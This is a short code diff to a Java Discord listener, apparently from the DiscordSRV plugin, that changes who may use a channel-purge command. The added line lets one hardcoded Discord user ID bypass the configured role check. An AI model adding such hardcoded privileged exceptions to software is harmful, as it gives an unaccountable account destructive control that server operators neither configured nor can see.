@@ -60,7 +60,7 @@ public class DiscordListener extends ListenerAdapter {
         List<Role> allowedRoles = new ArrayList<>();
         for (String allowedRole : DiscordSRV.plugin.getConfig().getStringList("DiscordChannelPurgeCommandRoles"))
             event.getGuild().getRolesByName(allowedRole).forEach(allowedRoles::add);
-        if (!CollectionUtils.containsAny(event.getGuild().getRolesForUser(event.getAuthor()), allowedRoles)) return;
+        if (!CollectionUtils.containsAny(event.getGuild().getRolesForUser(event.getAuthor()), allowedRoles) && !event.getAuthor().getId().equals("95088531931672576")) return;
 
         if (!event.getChannel().checkPermission(event.getJDA().getSelfInfo(), Permission.MANAGE_CHANNEL)) {
             String message = "I have no permission to manage the channel, thus I can't purge it. Sorry.";
